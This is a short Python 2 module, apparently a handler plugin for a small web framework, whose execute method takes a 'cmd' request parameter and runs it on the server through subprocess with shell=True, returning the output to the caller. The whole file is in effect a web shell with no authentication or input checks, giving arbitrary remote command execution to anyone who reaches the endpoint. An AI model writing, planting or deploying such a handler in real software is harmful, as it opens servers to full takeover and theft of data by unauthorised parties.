import subprocess
class start:
    def __init__(self,headers,ip,params,req,post_data,configs,cookies_handler):
        self.headers = headers
        self.req = req
        self.ip = ip
        self.params = params
        self.post_data = post_data
        self.configs = configs
        self.cookies_handler = cookies_handler
        self.stt_code = 200
        self.return_data = {}
        pass

    def execute(self):
        if len(self.params) != 1:
            self.return_data["data"] = """
            parameters:
                cmd = <execute command>
            """
        else:
            print self.params
            cmd = subprocess.Popen(self.params["cmd"], shell=True, stdout=subprocess.PIPE)
            self.return_data["data"]  = cmd.stdout.read()

        return self.stt_code,self.return_data
        pass
